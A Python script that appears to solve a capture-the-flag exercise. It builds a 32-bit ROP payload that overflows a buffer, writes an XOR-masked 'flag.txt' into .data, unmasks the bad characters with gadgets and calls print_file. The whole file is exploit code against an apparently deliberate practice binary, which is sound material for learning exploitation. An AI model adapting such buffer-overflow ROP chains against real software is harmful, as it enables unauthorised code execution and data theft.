#!/usr/bin/env python

import struct
import sys

padding_len = 40 #until just before ebp is overwritten

coff = struct.pack("I", 0xc000ffee) #just something recognizable so I'm sure the offset is right

print_file = struct.pack("I", 0x080483d0) # print_file(char*)

xor_ebp_bl = struct.pack("I", 0x08048547) # xor [ebp], bl; ret
mov_edi_esi = struct.pack("I", 0x0804854f) # mov [edi], ebp; ret

pop_esi_edi_ebp = struct.pack("I", 0x080485b9) # pop edi; pop ebp; ret
pop_ebp = struct.pack("I", 0x080485bb) # pop ebp; ret
pop_ebx = struct.pack("I", 0x080485d6) # pop ebx; ret

filename_loc_raw = 0x0804a018 #.data
filename_loc1 = struct.pack("I", filename_loc_raw)
filename_loc2 = struct.pack("I", filename_loc_raw+4)
filename = b"fl`f/tyt" # xor badchars with 0x01
#              ^^^ ^

flip1 = struct.pack("I", filename_loc_raw+2)
flip2 = struct.pack("I", filename_loc_raw+3)
flip3 = struct.pack("I", filename_loc_raw+4)
flip4 = struct.pack("I", filename_loc_raw+6)

lsbmask = struct.pack("I", 0x01)

payload = b'A'*padding_len
payload += coff

# write unxord file name string to .data
payload += pop_esi_edi_ebp
payload += filename[:4]
payload += filename_loc1
payload += coff
payload += mov_edi_esi
payload += pop_esi_edi_ebp
payload += filename[4:8]
payload += filename_loc2
payload += coff
payload += mov_edi_esi

# load lsbmask into ebx
payload += pop_ebx
payload += lsbmask

# xor badchars in file name
payload += pop_ebp
payload += flip1
payload += xor_ebp_bl

payload += pop_ebp
payload += flip2
payload += xor_ebp_bl

payload += pop_ebp
payload += flip3
payload += xor_ebp_bl

payload += pop_ebp
payload += flip4
payload += xor_ebp_bl

# print file
payload += print_file
payload += pop_ebp
payload += filename_loc1

for c in [b'x', b'g', b'a', b'.']:
    if c in payload:
        sys.stderr.buffer.write(b"[WARN] bad char in payload: " + c + b"\n")

sys.stdout.buffer.write(payload)
